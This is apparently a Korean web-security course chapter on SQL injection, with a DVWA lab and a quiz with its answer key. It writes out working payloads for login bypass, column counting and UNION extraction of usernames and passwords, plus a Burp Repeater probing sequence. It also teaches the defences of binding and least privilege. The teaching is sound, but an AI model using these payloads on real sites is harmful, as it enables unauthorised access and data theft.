웹 Level 6 장(chapter)

SQL Injection 기초

로그인 우회와 UNION 기반 데이터 추출을 이해한다.

⚠️ 실습은 본인 소유 VM·실습용 사이트(허가된 환경)에서만 수행하세요.

1. 학습 목표

  • ' OR '1'='1' -- 형태의 인증 우회 원리
  • UNION SELECT로 테이블 데이터 추출
  • 대응: Prepared Statement, 최소권한 DB 계정

2. 핵심 개념

  • ' OR '1'='1' -- 형태의 인증 우회 원리
  • UNION SELECT로 테이블 데이터 추출
  • 대응: Prepared Statement, 최소권한 DB 계정

2-2. 동작 원리 심화: 쿼리가 합쳐지는 순간

서버는 문자열을 이어 붙여 SQL을 만듭니다. 입력값에 따옴표·주석이 끼면 개발자가 짠 쿼리와 공격자가 완성한 쿼리가 달라집니다. 로그인은 우회되고, UNION은 다른 테이블을 끌어옵니다.

flowchart TD I["사용자 입력
id + pw"] --> Q["문자열 결합
SELECT ... WHERE"] Q --> C{"입력에 SQL 문법?"} C -->|없음| N["정상 쿼리 실행"] C -->|있음| M["쿼리 구조 변조
OR 1=1·주석"] M --> A["인증 우회·데이터 유출"] A --> U["UNION 확장
타 테이블 추출"]

읽는 법: 입력이 문자열로 합쳐지는 지점이 취약점입니다. 바인딩(Prepared Statement)은 값과 코드를 분리해 이 합침을 원천 차단합니다.

2-3. 단계별 추출표

단계목적페이로드 예시
우회로그인 통과' OR '1'='1' --
컬럼 수UNION 맞추기' ORDER BY 3 --
추출데이터 읽기' UNION SELECT user,password FROM users --
대응원천 차단바인딩+최소권한+에러 숨김

3. 예제

' OR '1'='1' --
' UNION SELECT user, password FROM users --

3-2. 심화 예제: Burp Repeater 진단 순서(실습 앱)

# 1) 따옴표 1개 삽입 → SQL 에러·동작 변화 관찰
id=7' 
# 2) 참/거짓 비교로 인젝션 확정
id=7 AND 1=1 --    (정상)
id=7 AND 1=2 --    (비정상·빈 결과)
# 3) ORDER BY로 컬럼 수 확정 후 UNION 추출
id=7 UNION SELECT 1,2,3 --
id=7 UNION SELECT user(),database(),version() --

4. 실습

  1. DVWA(security=low)에서 로그인 우회 재현 후 바인딩 코드로 수정.
  2. 따옴표·참/거짓 2종으로 인젝션 여부를 판정한다.
  3. ORDER BY로 컬럼 수를 확정한다.
  4. UNION으로 DB 사용자·버전을 추출한다.
  5. 바인딩 적용 후 동일 페이로드가 무력화되는지 검증한다.

5. 퀴즈

  1. 바인딩이 안전한 이유는?
  2. 에러 메시지를 숨기는 이유는?
  3. ORDER BY로 컬럼 수를 아는 원리는?
  4. UNION 사용의 전제조건 2가지는?
  5. DB 계정 최소권한이 필요한 이유는?
정답 보기
  1. 값과 SQL 코드를 분리해 입력이 코드로 해석되지 않기 때문이다.
  2. 에러 문구에 테이블·컬럼명이 노출되어 공격 힌트가 되기 때문이다.
  3. 존재하지 않는 번호에서 에러가 나므로 경계를 찾을 수 있기 때문이다.
  4. 양쪽 SELECT의 컬럼 수·타입이 일치해야 한다.
  5. 뚫려도 읽을 수 있는 범위를 최소화해 피해를 줄이기 위해서이다.

5-2. 한눈에 보는 진단 흐름

sequenceDiagram participant A as 진단자 participant S as 서버 participant D as DB A->>S: 따옴표·참거짓 판정 S->>D: 변조 쿼리 실행 D-->>S: 에러·결과 차이 S-->>A: 인젝션 확정 A->>S: UNION 추출 S-->>A: 데이터 반환

읽는 법: 판정→컬럼 수→추출 순서입니다. 에러를 숨긴 사이트는 다음 장 Blind 기법으로 넘어갑니다.

6. 흔한 실수

  • addslashes·따옴표 치환 같은 땜질로 끝내는 경우. 인코딩 우회에 뚫린다. 바인딩이 정답이다.
  • 수정 후 재시험을 생략해 우회 페이로드가 남아 있는 경우
